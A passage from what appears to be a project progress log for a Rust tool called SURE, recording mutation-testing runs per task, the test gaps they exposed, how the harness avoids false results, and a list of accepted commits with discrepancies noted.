  quoted argument that is not a name (`""`, `"not a key"`, `"1BAD"`), and the
  sentence's declared count, which no test had ever read because the only
  assertion on that sentence was `starts_with("SURE found 0")`.
- The fourth survivor is declared unobservable: removing `found.sort()` in
  `candidates`. The reason was **checked rather than assumed**, by reading
  `scan::Walk` — it sorts each directory's children by name and recurses inline,
  so `Scan::files` already yields component-lexicographic order, which is what
  `Path`'s `Ord` compares. The declaration records that it is unobservable *only*
  while the walker keeps doing that, which is the condition that would make the
  declaration wrong.

Two families, matching the acceptance's two sentences:

- **The extraction** (11 observable). Every way of finding a key that is not one —
  a name the code built at run time, a needle inside a longer identifier, an
  argument whose terminator was never checked, a quoted argument that is not a
  name — or of losing a key that is one: stopping at the first read on a line,
  counting lines from zero, reporting every Node read as a property read.
- **The record** (10 observable + 1 unobservable). Every way of letting a value
  reach the report, and every way of making the comparison say more than it can:
  an extractor returning the rest of the line, `.env` becoming a template, a
  document read as source, an incomplete reading reporting as complete, the
  sentence dropping its clause, the reads left in derived order.

### `P2-T012`

`target/tmp/mutate13.py` (git-ignored), 23 mutations over two files, exit 0:
*"all 22 observable mutations caught by a failing test, and 1 declared
unobservable as expected"* — 0 `SKIP`, 0 `BUILD`, and the unmutated baseline run
first was green, which it has to be: a mutation cannot be credited with a failure
that was already there.

Two families, and the second is the one that is easy to leave untested because
the type is *silent* when it is wrong:

- **The rule** (15). Every way of getting the level wrong that still reads as
  helpful: pick the strongest stack instead of the weakest; raise, remove, or
  compute-but-ignore the ceiling; assume a project with no manifest is `generic`;
  name the stacks that did **not** set the level; name every stack whatever it was
  graded; explain the ceiling when it did not apply and hide it when it did;
  invert the completeness clause so a walk that missed half the project reports as
  one that saw it all; name what was looked for in the code's vocabulary
  (`inspect_only`) rather than a person's.
- **The record** (8). `unrecorded()` returning `FirstClass` rather than the
  weakest level; `is_recorded()` answering yes for the state that means no answer;
  `unrecorded()` replaced by an assumed `Generic` classification;
  `ProjectSupport::new` discarding the level it was handed; a newly built
  `Project` carrying a classification nobody made; dropping `serde(default)` so a
  stored record without the field fails to load instead of reading as
  unclassified. These matter because **a caller reading only `level` cannot tell
  "nobody classified this" from "this is level C"** — `unrecorded()` returns a
  real level — so a build that defaulted to `FirstClass` would report every
  unexamined project as the best-supported one.

**One mutation is a tripwire rather than a bug.** It reorders `SupportLevel`'s
variants so the strongest sorts highest, which silently inverts every project's
level because `weakest` is `Ord::max`. Nothing in the enum's declaration says
which end is strong, so this is exactly the tidy-up a later reader would make,
and `the_order_of_the_levels_is_by_strength` is the test that stops it. A
mutation list without it would leave that test's value unmeasured.

**One mutation is declared unobservable, and the first run's `MISSED` verdict on
it was correct rather than a hole.** It changes the arm under
`if understood == level` to name `understood` where it names `level` — and inside
that arm the two hold the *same* value, so no test can tell the versions apart
because nothing can. It is declared rather than deleted (a mutation left out of
the list is a gap nobody knows about; one declared here is a claim that the two
programs are the same program, and the run reports it loudly if that stops being
true), and **a mutation of the same arm that a test *can* see was added in its
place** — the reason dropping the level name altogether.

**Two arms had no test until the mutation list was written, and both were closed
before the run:** `what_was_read`'s "and graded all of them" arm, and
`ProjectSupport::new` preserving the level it was handed. Writing the mutation
list is what found them, which is the argument for writing it before the tests
are called finished rather than after.

### `P2-T007`

`target/tmp/mutate11.py` (git-ignored), **20 mutations, 20 observable, 0 declared
unobservable**, exit 0: *"all 20 observable mutations caught by a failing test,
and 0 declared unobservable as expected"*.

Four families, and the second is the one the task's second acceptance criterion
is about:

- **A stack SURE did not read, presented as one** (9). `Partial` and `Unknown`
  widened into `Read`; `is_read` answering `true` everywhere; a member whose
  manifest *was* read reported as one that was not.
- **"I did not look" presented as "there are none"** (3). Python's unread member
  list answered as `NoWorkspace`; `is_known_single` answering `true` for
  everything; a truncated member list reported as complete. Each turns a caveat
  into a finding.
- **One place reported as two, or as the wrong place** (5). The merge removed so
  a directory two ecosystems name becomes two components; containment decided by
  the text of a path rather than by its path components; containment to the
  outermost rather than the nearest component; the root contained by itself; the
  components left in the order the ecosystems named them instead of sorted by
  path.
- **An absent fact invented, or a real one dropped** (3). A root manifest
  reported as read whatever it was; an ecosystem that was never found reported as
  one that read a declaration and named nobody; `root_component` handing back the
  last component.

**The first run was not clean, and the three holes it found were real.** Three
mutations came back `MISSED`:

1. *a pyproject.toml SURE could not read is reported as no manifest* —
   `python_root_reading` has an arm that prefers a recorded failure over a
   missing file, and nothing tested it. Fixed by
   `a_pyproject_toml_that_could_not_be_read_is_unread_rather_than_no_manifest`.
   The Node case had a test; the Python case had none, and the Python case is the
   one with two root files and a preference rule between them.
2. *a member list that was cut short is reported as complete* — nothing set
   `max_workspace_members` low enough to observe truncation. Fixed by
   `a_member_list_that_was_cut_short_is_not_reported_as_complete`.
3. *the root is reported as contained by itself* — every containment test found
   edges **by looking one up**, so an extra edge nobody asked about was invisible.
   Fixed by asserting the total: `contains.len() == members().count()`.

The third is the one worth remembering: a test that looks an edge up by its key
cannot see a duplicate, and a test that asserts the count can. The first two are
the same shape as each other — a rule with a dedicated arm and no test aimed at
that arm, in a module where every other arm had one.

One mutation was written and then **replaced before it ran**: *a dependency
naming a workspace package is turned into a component* was a no-op edit that
would have come back `MISSED` and proved nothing, because a mutation can only
replace text and this bug needs code added. A mutation that cannot fail is not
evidence, and leaving it in would have produced a `MISSED` that looked like a
hole in the tests rather than a hole in the harness.

The harness carries `mutate10.py`'s three counting rules unchanged — a
non-unique anchor is `SKIP` and counts as nothing, a compile error is `BUILD` and
never `CAUGHT`, and **the suite is run unmutated first and a red baseline ends
the run**. The baseline guard is copied into this file rather than shared,
because a harness that depends on another harness is one more thing that can be
missing when it is needed.

### `P2-T006`

Thirty-four mutations in `target/tmp/mutate10.py` (git-ignored), run against
`cargo test -p sure-core --lib --test discover_rust --test discover_node --test
discover_python --no-fail-fast`. **Thirty-two CAUGHT, zero MISSED, zero SKIP,
zero BUILD**, and **two declared unobservable**, which print `MISSED*` and do not
fail the script. The script's own last line is the verdict, and it reads *"all 32
observable mutations caught by a failing test, and 2 declared unobservable as
expected"* with exit code 0. The figures here are the re-run **on the tree as it
stands after the `pattern.rs` tests**, after the last edit to either the module or
the script, and the reverted tree was checked afterwards (`git status` shows only
the files this commit touches).

**The baseline is now checked by the script, and that is the most important line
in it.** The run before this one reported `DECLARED UNOBSERVABLE BUT CAUGHT` for
both of its declared-unreachable mutations — which should be impossible, and was
not: the suite was **already failing** before the first mutation was applied, so
every mutation "failed a test" and the verdicts meant nothing. The cause was the
`pattern.rs` scratch helper's use of the process id (see "What the second
`P2-T006` commit added"). A mutation cannot be credited with a failure that was
there before it, so the script now runs the suite unmutated first and stops with
`BASELINE IS NOT GREEN` if it is not clean. Checking that by hand — which is what
was done before this run — is a step a person can forget, and it was forgotten.

**The second change is the same rule applied where the code had not followed
it.** A mutation that stops the code compiling is `BUILD`, but the FAILED lines
and the compiler-error lines were collected into one list, so an `error:` line
reaching stdout would have been enough to return `CAUGHT`. The two lists are now
separate, and only a failing *test* can produce a catch. The rule was written
first and the code merged its two cases; this is the rule with the merging
removed.

The families are the three the module is arranged around, and every mutation is a
plausible **wrong implementation of detection** rather than a random edit:
*"not there" arriving as "there but unreadable"* and the reverse (1–8); *an
invented fact* (9–18); and *a weaker source overriding a stronger one, or a rule
applied that SURE cannot cite* (19–23). The last four cover what counts as a Rust
project at all and the two lint tools Cargo defines. A **fourth family (28–34)**
is anchored on `pattern.rs` rather than on `rust.rs`, so the tests added in the
second commit are shown to be load-bearing rather than counted as coverage: the
containment rule (28–29), `*` naming directories and not files (30), the root
never being its own member (31) and never being named twice (32), a refusal told
apart from a pattern that named nothing (33), and the `Normal`-only guarantee
(34, declared unobservable).

**Two mutations revert a decision this task made and documented, which makes them
the most valuable here: they are the bugs that were designed out rather than
discovered.** Mutation **24** reads `[workspace]` from the wrong key — the exact
shape of the first draft of `from_json`, where the workspace tables hung off
`PackageSection`, so a virtual manifest's *entire* workspace would have been
dropped. Mutation **23** puts a `cargo` command back on a project whose manifest
SURE never read — the first draft of `command_for` gating on `package()` rather
than on the document. Both CAUGHT.

**The script found six problems on its first run, and five of them were real test
gaps closed with five new tests rather than reclassified:**

- a **member whose `Cargo.toml` is a directory**, not a file, was reported as a
  member with no manifest — a false statement about the project wearing a
  negative finding's clothes;
- a **toolchain file that could not be read as a file** — the existing test
  reached the `toolchain_from_text` error arm and never the `ReadFile::Unread`
  arm, so a `rust-toolchain.toml` over `max_manifest_bytes` was reported as a
  project that pins nothing;
- a **non-string in a `members` list** was turned into a directory name, so
  `members = [1]` invented a member called `1`;
- a **value read with the whitespace the file carried**, so `name = "  app  "`
  reached a finding with its spaces;
- a `Cargo.toml` that failed to parse could be reported as declaring nothing.

**The sixth is genuinely unreachable and is declared rather than hidden.** The
arm for a `Manifest::from_json` failure cannot be reached from a file: `read_toml`
parses with `toml::from_str::<toml::Value>`, and a TOML document **is** a table,
so `to_json` always yields `Value::Object` and the guard never fires for a caller
that went through the walk. The guard is pinned directly instead, by
`a_document_that_is_not_a_table_is_not_read_as_an_empty_manifest`, which hands
`from_json` the four non-tables a **direct** caller could pass. It stays rather
than being deleted because deleting it would make `from_json` answer a non-table
with an empty manifest — the false green this module is arranged against — the
moment any future caller reaches it by another route. **The second declared-
unreachable mutation is the matching half in `pattern.rs`** (34): the
`Component::Normal` arm of `expand` is unreachable because `contained_relative`
returns only `Normal` components, so `continue` and `return Err` behave the same —
until mutation 28 breaks the first half, which is why 28 is caught and 34 is not.
Both arms stay for the same reason: each is a guarantee stated where a future
caller can read it instead of trusted to a function in another module.
The script also reports the opposite error: an `UNOBSERVABLE` entry that starts
being `CAUGHT` is printed as `DECLARED UNOBSERVABLE BUT CAUGHT`, because it means
the list is now wrong — and that line is what exposed the run whose baseline was
red, so the check it was written for was never the check that made it useful.

**`BUILD` does not count as caught, and the rule earned its keep immediately —
against this author.** An edit made while writing the tests used
`manifest.package()` where `package` is a field, which broke the lib test target,
and the harness reported **all 27 mutations as `BUILD`**. Had `BUILD` counted as
caught, that run would have read as full coverage of a suite that did not compile.

**Mutation 7 needed a test edit rather than a test, and that is recorded because a
mutation caught by a rule other than the one it removes has not been tested.** The
toolchain-shape test's list already held `channel = "stable"` *with spaces*, but
that spelling is rejected by the bare-form line-count check even when the
`WrongShape` guard is deleted — so the mutation was being caught by a different
rule than the one it removes. `channel="stable"`, one token, which **only** the
guard can reject, was added to the list.

**Two stale cross-references in the script's own docstring were corrected against
a mechanical numbering of the list** rather than by eye: it cited *"mutations 1–8,
28"* where the list has 27 entries and no 28, and called the workspace-from-the-
wrong-key mutation 13 where it is 24. A scratch file that will be cited as
evidence is a document, and a document with a wrong number in it is the thing this
section keeps finding.

### `P2-T005`

Twenty-three mutations in `target/tmp/mutate9.py` (git-ignored), run against
`cargo test -p sure-core --lib --test discover_python --test discover_node
--no-fail-fast`. **Twenty-two CAUGHT, one MISSED, zero SKIP, zero BUILD**, and
the one missed is recorded with its reason and a verdict of *right*.

**The count is a re-run, and it corrects two numbers written earlier in this
session.** The first report said 22 mutations and 21 caught. Both were wrong by
one, in the same direction: the figures were written from the script as it stood
before its last mutation was added, and were never re-counted against the file.
`grep -c '^CAUGHT'` over the re-run's output is where 22 comes from, and the
script's own entry count is where 23 does. **It is recorded rather than quietly
fixed because a mutation count is precisely the sort of figure a later reader
treats as measured** — and because the error is the one this repository keeps
finding: a number that was true of an earlier state, carried forward past the
change that invalidated it. The reverted tree was checked afterwards (`git
status` clean of everything but `progress/state.json` and `progress/HANDOFF.md`,
which are this commit), so no mutation was left applied.

The run is the same three families `P2-T004`'s was, which are the three the
module is arranged around:

- **"Not there" arriving as "there but unreadable", and the reverse (1–6).** A
  `pyproject.toml` that failed to parse reported as a project with no
  `pyproject.toml`; a file SURE could not read absent from the result; a
  `setup.py` on its own, or a lockfile on its own, not making it a Python
  project.
- **An invented fact (7–11).** A URL read as a distribution called `https`; a
  build *library* named as the project's installer; a build plan offered to a
  project that declared nothing that builds it; a role with no declared tool
  given a command anyway.
- **A weaker source overriding a stronger one (12–15).** A requirements file
  deciding the installer over a `uv.lock`; two lockfiles resolved to the first
  instead of reported.

Plus bounds, reading, the level and the build plan's command (16–23).

**The script found one real hole in a suite that was already green, and it is
the same shape as `P2-T004`'s.** *"A project that declares no manifest is graded
as fully understood"* — changing the "recognised, but nothing SURE reads declares
anything" arm's level from `InspectOnly` to `Generic` — **passed every test**. So
a project SURE had read nothing from, a bare `uv.lock` or a bare
`.python-version`, was being reported as a project SURE fully understands. That
is the false-green direction exactly. **The mutation is now CAUGHT**, by
`a_project_with_no_manifest_sure_can_read_is_not_called_fully_understood`, which
also asserts the reason carries no project text.

`target/tmp/mutate8.py`'s two counting rules were kept, and both were earned
again in this run:

- **Two mutations came back `SKIP` because `rustfmt` had reformatted the block
  after they were written** — the anchor appeared zero times. An anchor that does
  not match exactly once counts as **nothing**, not as caught, which is what
  stops a report of a false green being itself a false report. Both were
  rewritten against the real text and both are now caught.
- A mutation that stops the code compiling prints `BUILD` and is not counted as
  caught.

**One mutation is not caught, and the verdict is right.** *"A plan with no
command still names tools as its evidence"* replaces a reset of `because` with a
plain rebinding and no test notices — because the guard is currently
unobservable: `CommandRole::Install` is the only role whose reasons can be
non-empty while its command is `None`, and `Install::tool_roles()` is `&[]`. It
stays because it makes the invariant hold for a **new** role by construction
rather than by the next author noticing, which is the standing
`FINGERPRINTING.md` gap 8 records for its sort and its domain tag. Recorded
rather than papered over with a test that would have to invent a role to reach
it.

**One mutation is deliberately absent, and the script says so.** *"`looks_like_one`
admitting a bare `.py` file"* is not expressible as an edit to it: its parameters
are six booleans and lists built from named files, so the edit would need the
markers returned by the *walk*, and `requirement_candidates` is the only place
`child_files` is consulted. Mutation 3 puts an arbitrary file into that candidate
list — the closest expressible form — and the marker list itself is covered by
two tests that do not depend on that function:
`every_file_that_marks_a_python_project_is_enough_on_its_own` (the integration
test, which writes each marker into a fixture and requires the project to be
recognised) and `.._is_on_the_list_that_decides` (the unit test, which checks the
list against the markers the walk can produce).

### `P2-T004`

Twenty-seven mutations in `target/tmp/mutate8.py` (git-ignored), run against
`cargo test -p sure-core --lib --test discover_node --no-fail-fast`. **All
twenty-seven applied mutations were caught; none was reported MISSED, BUILD or
SKIP in the final run.**

Each is a plausible wrong *reading* rather than a random edit, and the direction
that matters is the false green. Grouped by what they attack:

- **Package managers (1–5).** The lockfile is invisible; two lockfiles are read
  as agreement; a disagreement is answered anyway; an unrecognised manager is
  guessed at; an `engines` range is ranked as strongly as a lockfile.
- **Workspaces (6–11).** The root joins its own workspace; a pattern SURE cannot
  expand is answered as one that named nothing; `**` is expanded as a single `*`
  instead of being refused; a truncated list keeps quiet; the pnpm workspace file
  is read and then ignored.
- **Scripts (12–13, 16).** A conventional role with no script vanishes from the
  rows; a script with no command is dropped rather than reported; npm is made to
  use `run` for the two scripts it does not.
- **Dependencies (14–15).** The one that found the hole — see below.
- **The enum rule (17–24).** These are the point of the task, and each makes "I
  could not read this" arrive as "there is nothing here": a link at a manifest's
  name becomes an absence; a budget refusal and a shape failure live in the state
  but not in the result; a file over the byte limit is read from the part that
  fitted; an unread manifest is graded as one SURE can read.
- **The rest (25–27).** The conclusion stops naming its files; a climbing path is
  kept rather than refused; the stack for a level is reported as a new word
  instead of the domain's.

Two mutations are **deliberately absent** and the script's docstring records why,
rather than leaving a reader to assume the run was exhaustive: substituting a tool
name is not expressible, because `collect_tooling` only pushes a row when the
dependency's name already equals it, so there is nothing to substitute; and the
tooling sort cannot be observed from one run, for the same reason `P2-T003`
recorded for the fingerprint's sort — one run sees one filesystem's order.

Three anchors were rewritten after the first run, each for a different reason and
each a real hazard worth naming: one anchor matched **two** identical probes and
was extended until it matched once; one mutation removed a binding's only use and
therefore **did not compile**, which the script reports as `BUILD` rather than
counting as caught; and one was a **no-op** that would have read as a clean miss.

The script reports `SKIP` for an anchor that does not appear exactly once and
`BUILD` for one that does not compile, and neither is counted as caught. **That
distinction is what made the one real finding visible**: *"a dependency with no
range is dropped instead of reported"* came back **MISSED** — not skipped, not a
build failure. The field simply had no test, and the mutation that deletes it was
invisible to a suite that was entirely green.

### `P2-T002`

Twenty mutations at the acceptance, **twenty fired**; **twenty-three at
`9f13f0d`, all twenty-three caught**, plus one applied and reported `BLIND`, in
`target/tmp/mutate6.py` (git-ignored). Every one is a plausible *wrong
implementation of fingerprinting*, not a random edit, and most make the
fingerprint ignore something it must not — the false-green direction, and the
direction the two acceptance criteria are about.

The script got two things right that the earlier ones did not, both because of
failures in its first version:

- **A mutation that stops the code compiling is now reported as `BUILD`, not as
  caught.** A non-zero `cargo` exit with no `FAILED` line says nothing about
  whether a test would have noticed the behaviour, and counting it as caught is
  the same false green this script is looking for, one level up. Two mutations in
  the first run were exactly this.
- **An anchor that does not match exactly once prints `SKIP`.** The first version
  of "HEAD is not part of the fingerprint" still hashed HEAD — a no-op mutation
  that was duly reported MISSED, i.e. a hole that did not exist. A mutation
  reported as missing when it was never applied is a false report of a false
  green, which is worse than either.

The catches worth naming:

- **HEAD not digested**, **the branch name digested**, **a clean project's empty
  change list digested like a full one**, **an untracked file dropped**, **a file
  deleted made equal to a file emptied** (using the literal SHA-256 of the empty
  string), **a file's own path left out of its digest**: each fails at least one
  test, and together they are the first acceptance criterion.
- **The ignore tables not applied**, **a walk that lost something hashed
  anyway**, **a file that moved inside the walk keeping its place**, **the
  project's place inside the repository ignored**: the second acceptance
  criterion, and the errors-not-partial-fingerprints rule.
- **Both budgets** — the file budget not enforced, and the byte budget applied
  per file instead of per fingerprint.
- **Three about what Git is asked**: `--relative` added after all (the flag that
  silently prints nothing on Git 2.55.0), `--no-renames` dropped, and
  `--untracked-files=normal` instead of `all` — the last being the one that
  makes a nested checkout one opaque line.
- **Two refusals**: a relative root quietly resolved against the working
  directory, and a Git that will not start reported as a Git that failed. The
  second matters because the first message says "install Git" and the second says
  "Git ran and refused", and a user told the wrong one fixes the wrong thing.
- **Two about the framing itself**: fields written without their length (`ab`+`c`
  = `a`+`bc`), and an absent field written as an empty one.

**Three real holes, found by mutations that were green**, and the tests written
to close them:

1. **`Reader::tree` — the whole nested-repository walk, the per-file path digest
   inside it, and the `IncompleteTree` guard — was reached by no test at all.**
   `a_directory_git_will_not_descend_into_is_walked_and_read` builds a real
   nested `git init` inside the fixture; probing Git confirmed it is reported as
   one untracked directory (`? inner/`) even under `--untracked-files=all`, which
   is precisely why the walk exists. It asserts the change of a file inside the
   nested checkout, the addition of the nested checkout, and that a file moved
   *within* the walk changes the fingerprint.
2. **The monorepo test proved stability, not correctness.** It asserted that a
   fingerprint is unchanged when nothing changes, so an implementation that never
   stripped `--show-prefix` — looking every path up at `<root>/<prefix>/…`,
   finding `Gone`, and hashing nothing — passed every assertion it made.
   `a_change_inside_a_project_that_is_not_the_repository_root_is_read` now edits
   the same file twice and requires the two fingerprints to differ, which is the
   only form of that test that reads a file.
3. **The byte budget was only ever exercised with one file**, so per-file and
   per-fingerprint were indistinguishable.
   `the_byte_limit_is_over_the_fingerprint_and_not_over_each_file` writes two
   600-byte files under a 1 000-byte limit and requires the error to name the
   file that crossed it.

**What this run does not cover, stated rather than implied.** The link and
unreadable-file paths are `#[cfg(unix)]` in the test file, so no mutation was
applied to them on this machine — the script's own header says so. That is not
coverage; it is the reason the `ubuntu-latest` and `macos-latest` CI jobs exist.
And the mutation list is a list: twenty-three plausible wrong implementations,
not the space of wrong implementations.

**The Unix-only entry is now applied and reported `BLIND`, not omitted.** At
`9f13f0d` the script gained a second list, `UNIX_ONLY`:

```
BLIND   a pipe is opened instead of being described: as expected
NOT OBSERVABLE ON THIS PLATFORM (1), so unverified here:
  - a pipe is opened instead of being described
```

It is applied and run anyway, so a stale anchor or a mutation that no longer
compiles is still caught here; but it is reported as neither `CAUGHT` nor
`MISSED`, because both would be a claim about a code path that did not execute.
`MISSED` would be the quiet lie and `CAUGHT` the loud one — a Windows test
cannot have noticed a Unix-only behaviour, so a failure there would mean
something *else* broke. Omission was the third option and the worst: the earlier
header described the gap in prose, and a reader skimming twenty-three `CAUGHT`
lines does not see it.

Two entries were added at `9f13f0d`, both caught:
**`core.fsmonitor=false` dropped from `Git::SAFETY_ARGUMENTS`**, and
**`--no-pager` dropped instead**. They are worth naming because on every
repository that does not exploit them the fingerprint is *identical* with and
without them — the only failing test is the one that reads the constant, which
is the entire reason the constant exists rather than the arguments being written
inline at the call site.

### `P2-T001`

Twenty-eight mutations, **twenty-seven fired, one did not**, in
`target/tmp/mutate5.py` (git-ignored). The one that did not is recorded in
`PROJECT_DISCOVERY.md` §Known coverage gaps rather than deleted from the list: a
mutation that escapes because its *input cannot be built* is a gap, and a
mutation quietly removed from the list is a gap nobody knows about.

Six are the false-green shapes this task exists to prevent:

- **`is_complete()` returning `true` unconditionally**, and separately **a loss
  reason moved into the "by design" group** and **a declared skip moved into the
  loss group**. The first two fail a dozen tests; the third fails
  `every_reason_answers_both_questions_consistently`, which is the test that
  exists because the two predicates must not be each other's negation.
- **A link filed under whatever name it has** (the ignore table consulted before
  the symlink arm) fails `a_link_is_a_loss_whatever_it_is_called`. **This test
  was written because the mutation found the hole**, not the other way round: the
  first version of the link test used a link called `shortcut`, which is not an
  ignore-table name, so the ordering the module comment claims was unenforced.
- **A link reported as `Vendored`** — the same false green by the other route —
  fails the same test.

Three found real holes and two were equivalent mutants, which is the more useful
half of the result:

- **A rule matched against the relative path instead of the name** — i.e. "the
  ignore tables apply only at the top level" — was **green** until
  `a_left_out_directory_is_left_out_at_any_depth` and
  `a_nested_version_control_directory_is_left_out_too` were added. Every existing
  fixture had `node_modules`, `target` and `.git` at the root, so a scanner that
  would read a vendored tree in a real workspace passed the whole suite.
- **Sorting by `to_string_lossy()` instead of by the `OsString`** was **green**
  until the file-name test below was written. The comment in `mod.rs` claimed the
  text sort loses the order; nothing tested it.
- **The Unicode fold instead of the ASCII fold** was an **equivalent mutant**
  through `matching_rule`: no name in either table contains a letter with a
  non-ASCII lowercase twin (the kelvin sign is the only Latin one, and no rule
  contains a `k`). It is caught now by
  `the_fold_is_ascii_rather_than_the_one_unicode_defines`, which calls the private
  `name_matches` with a rule named `kotlin-build` precisely because going through
  the tables cannot see the difference.
- **Dropping a `read_dir` entry the operating system failed to describe** is the
  one that escapes. See the gap note above.

### `P1-T011`

Fourteen mutations, fourteen fired. The script is `target/tmp/mutate4.py`
(git-ignored) and it prints `SKIP` loudly when an anchor does not match — see the
`P1-T009` note below for why that matters more than the pass count.

Three are the false-green shapes this task exists to prevent, and they are the
ones worth keeping:

- **A project layer granting itself execution authority** — `Layer::can_grant`
  answering `true` for `Project` — fails
  `a_project_file_cannot_grant_itself_anything`,
  `only_the_user_layer_can_grant`, and the refusal-count assertions. This is the
  whole acceptance criterion in one line.
- **A refusal dropped instead of reported** — filtering refused privileges out of
  `privileges()` — fails
  `a_refusal_keeps_the_request_that_was_refused`. The distinction between "asked
  and refused" and "never asked" is the reason `Privilege` is a struct and not a
  `Vec<ProjectRequest>`.
- **The permission set starting with the network already allowed** fails the
  test that builds the set from `inspect_only()` and the test that requires an
  ungranted request to change nothing.

Two more are worth recording because they were **holes the mutations found
rather than confirmed**:

- **`resolve` keeping the *last* stricter value on a tie instead of the first**
  was green until `when_both_layers_ask_for_the_same_thing_the_user_is_named`
  was added. A tie silently named the *project* as the reason a restriction
  exists, which is exactly backwards.
- **`near_miss_beside` keying off the directory rather than the file name** was
  green until `the_near_miss_check_follows_the_file_name_not_the_directory` was
  added — the same class of bug, and the reason that test exists at all.

### `P1-T010`

Six mutations, six fired. The script is `target/tmp/mutate3.py` (git-ignored).

- **`negotiate` agreeing with any version at or above this build's** fails five
  tests across `handshake.rs`, `event.rs` and one already-written
  `round_trip.rs` test. The cheapest plausible wrong rule, and the most
  damaging: an adapter would be told yes and send events SURE then misreads.
- **The two directions swapped** fails `a_mismatch_says_which_side_has_to_move`
  and nothing else — which is the point of that test. A caller told the wrong
  direction retries with the fix that cannot work.
- **A refused handshake exiting 0** is the false-green mutation and fails three
  unit tests plus the process-level one. It is the check this task exists for.
- **The CLI answering every caller with its own version** fails both the unit
  test that compares the CLI's answer to `negotiate`'s and the integration test.
- **`is_an_answer` true for a refused handshake** fails two unit tests and the
  integration test's `stdout.is_empty()`, so the complaint cannot be moved onto
  the stream a caller is reading an answer from.
- **The event reader comparing versions itself** — written so that it accepts an
  *older* version the handshake refuses — is caught by
  `the_reader_and_the_handshake_refuse_the_same_versions` **and by that test
  alone**. Worth recording: the first version of this mutation accepted a
  version *above* the tested range and escaped, which is a property of the
  range, not of the test. A mutation outside the range it wrote is not evidence
  about it.

### `P1-T009`

Six mutations, six fired. Two are worth keeping:

- **Making the store open before the presence check** — a diagnostic that
  creates what it diagnoses — fails `tests/doctor.rs::the_report_never_creates_what_it_reports_on`
  and the `sure-core --lib doctor` tests.
- **Putting `version_string()` back into `Build.version`** reproduces the
  `SURE SURE 0.0.0-bootstrap` defect. It was found by reading output, not by a
  test, so the test came after; that is the wrong order and it is worth saying
  so.

The first attempt at the store-creation mutation reported `SKIP` because the
replacement text did not match the file — `target/tmp/mutate2.py` was rewritten
against the real `match presence(store_file)` text. **A mutation that reports
SKIP has tested nothing, and a script whose only output is "all fired" will say
that about a mutation that never applied.** Both scripts print SKIP explicitly
for this reason.

### `P1-T008`

- **Making a refusal exit 0** fails `main::tests::a_bare_sure_is_not_a_success`
  and `commands::tests::…` in the unit tests, and three in `cli_contract.rs`.
  This is the false-green rule inside SURE's own front door.
- **Flipping `Report::is_an_answer`** so a complaint went to stdout fails one
  unit test and two integration tests. **Visible only under `--no-fail-fast`** —
  without it `cargo test` stops at the first failing target and the integration
  file never runs, which is why the gate command carries the flag.
- **Adding a stray `println!` outside `output.rs`** fails four tests, including
  `only_the_output_module_writes_to_a_stream`. Checked by mutation because a
  source scan is the only thing that can catch an *absence*; no run of the binary
  demonstrates that a line was never written.
- **Reading standard input in `hook ingest`** fails
  `hook_ingest_does_not_read_standard_input`, which writes a megabyte into the
  pipe and requires a broken pipe. A command that drained the event and then
  refused would have destroyed the evidence it was refusing to record.
- **Adding a `Command` variant** produces `E0004` in two places (`Command::name`
  and `Command::report`), so a new command cannot ship with no answer about
  whether this build carries it out.
- **Making `frame()` report the wrong command name** fails
  `cli_contract.rs::the_machine_form_is_one_object_on_one_line_of_standard_output`
  at line 213. Worth recording *which* test caught it: the unit test beside it
  compares the frame against `report.command()`, so it stays green under this
  mutation — it is self-consistent by construction. **The integration test is the
  one that is load-bearing for the frame's content.**

### `P1-T005` and earlier

- Removing `features = ["bundled"]` from the workspace `rusqlite` entry fails
  `store_packaging::sqlite_is_compiled_into_sure…`. Worth knowing *why* the test
  exists rather than leaving it to the build: without `bundled`,
  `cargo build -p sure-core` still **succeeds** — it produces an rlib, and an
  rlib is never linked. The failure arrives later as
  `LNK1181: cannot open input file 'sqlite3.lib'`, and only on a machine that
  has no system SQLite. On this machine it does not, so this is also the direct
  evidence for the acceptance criterion.
- Adding `tokio` to `[workspace.dependencies]` fails
  `no_async_runtime_has_arrived`. Confirmed the test is not vacuously green: the
  same line-based reader finds `rusqlite` in the same section.
- Removing the in-transaction version re-read in `apply_one` fails
  `a_migration_another_process_already_ran_is_not_run_a_second_time` with
  `table records already exists`, and **does not** fail the cross-process test.
  With the journal-mode wait in place the children are serialised past that
  window. Both tests carry a comment saying so; the cross-process test says what
  it does not cover.
- Earlier in this branch: `P1-T007`'s `additionalProperties: false` bug (checked
  inside the `properties` lookup, so a closed object with no `properties` allowed
  every key) and the `issue` → `issue_id` repair-contract gap.

**The file name that is not valid Unicode, and how it got tested.** The previous
entry in this file recorded it as a gap ("cannot be constructed on Windows at
all"). It can be: `OsString::from_wide(&[0xD800])` is an unpaired surrogate, Rust's
`OsString` on Windows is WTF-8 so it holds one, and NTFS does not forbid it. It is
now tested, and it is the test that makes the sort mutation visible, because a
name that cannot be rendered is the *only* case where sorting by name and sorting
by rendered text disagree: an unpaired surrogate and `\u{E000}` sort one way by
bytes and the other way as text. Both orders were checked with a standalone probe
first. macOS is excluded from the test, and the reason — APFS validating a file
name as UTF-8 — is written down as a belief rather than a fact, because verifying
it needs a Mac.

## Accepted work on this branch

- `82650ac` **`P0-T001`** and `dc44ae0` **`P0-T002`** — and **the two commits
  disagree with their own messages, which is why they are one entry.** `82650ac`
  is P0-T001's commit: it validates the 17-phase / 166-task bootstrap package
  against `validate-bootstrap.mjs`, `taskctl.mjs validate` and
  `Validate-Bootstrap.ps1` at `0c85181` — **and it also adds
  `scripts/git-guard.mjs` (+149, new), which its message does not mention.**
  `dc44ae0` is P0-T002's commit and it is **empty — it changes no file at all** —
  while its message opens *"Add `scripts/git-guard.mjs`"*. **So the guard that
  mechanically enforces the Git policy is `P0-T002`'s deliverable and it landed
  under `P0-T001`'s id**, and a reader who trusted the subjects would attribute it
  to the wrong task and believe P0-T002's commit contained something.
- `06e64b2` **`P0-T003`** — 16 files: all eight modules of the frozen vocabulary
  (`status.rs` +812, `vocabulary.rs` +711, `execution.rs` +628, `evidence.rs`
  +492, `ids.rs` +465, `intent.rs` +407, `capability.rs` +371, `severity.rs`
  +151), `sure-domain/src/lib.rs` (+55), `sure-core/src/lib.rs` (+40),
  `sure-cli/src/main.rs` (+67 −7), three `Cargo.toml`s and `Cargo.lock`. **4204
  source lines under `crates/`, which is the largest of the eight `P0` commits and
  the fourth largest on this branch** — behind `68e51d8` (4490), `9c931d0` (4421)
  and `e10f620` (4410), measured rather than estimated, because the first draft of
  this sentence said "the largest on this branch" and three `P2` commits are
  larger.
- `69bde28` **`P0-T004`**, `84f1dd0` **`P0-T005`**, `f643187` **`P0-T006`**,
